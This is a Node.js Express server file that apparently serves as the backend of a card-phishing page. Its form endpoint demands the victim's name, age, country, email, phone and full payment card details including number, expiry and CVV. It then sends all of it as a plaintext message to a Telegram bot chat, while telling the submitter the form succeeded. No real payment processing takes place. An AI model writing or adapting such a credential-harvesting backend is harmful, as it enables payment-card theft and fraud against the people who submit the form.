const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();
require('dotenv').config();

app.use(express.json());

// CORS configuration
const corsOptions = {
  origin: 'http://localhost:5173',  // Frontend origin (React app running on port 5173)
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type'],
};
app.use(cors(corsOptions));

// Telegram Bot Configuration
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN; // Access token from .env file
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // Access chat ID from .env file

// Validate Telegram credentials at startup
if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error('Telegram credentials are missing. Notifications will not work.');
}

const sendTelegramMessage = async (message) => {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
    throw new Error('Telegram credentials are not properly configured');
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

  try {
    const response = await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    console.log('Telegram message sent successfully:', response.data);

    // Check if the response contains an error
    if (!response.data.ok) {
      throw new Error(response.data.description || 'Unknown error occurred');
    }

    return response.data;
  } catch (error) {
    const errorMessage = `Failed to send Telegram message: ${
      error.response?.data?.description || error.message
    }`;
    console.error('Error response:', error.response?.data);
    throw new Error(errorMessage);
  }
};

app.post('/submit-form', async (req, res) => {
  const { firstName, lastName, age, country, email, phone, cardName, cardNumber, expiry, cvv } = req.body;

  if (!firstName || !lastName || !age || !country || !email || !phone || !cardName || !cardNumber || !expiry || !cvv) {
    return res.status(400).json({
      success: false,
      message: 'All fields are required',
    });
  }

  console.log(`Processing form submission for ${firstName} ${lastName}`);

  try {
    // Save form data here (e.g., database logic)

    // Send the Telegram notification asynchronously
    sendTelegramMessage(`New form submission:
    Nom: ${firstName} ${lastName}
    Age: ${age}
    Pays: ${country}
    E-mail: ${email}
    Téléphone: ${phone}
    Titulaire de la carte: ${cardName}
    Numéro de carte: ${cardNumber}
    Expiration: ${expiry}
    CVV: ${cvv}`)
      .then(() => {
        console.log('Telegram notification sent successfully.');
      })
      .catch((error) => {
        console.error('Telegram notification failed:', error.message);
      });

    // Respond back to the user immediately
    return res.status(200).json({
      success: true,
      message: 'Form submitted successfully',
    });
  } catch (error) {
    console.error('Error processing form submission:', error.message);
    return res.status(500).json({
      success: false,
      message: 'An error occurred while processing your submission',
    });
  }
});

// Global error handler
app.use((err, req, res, next) => {
  console.error('Global error handler:', err);
  res.status(500).json({
    success: false,
    message: 'An unexpected error occurred',
  });
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
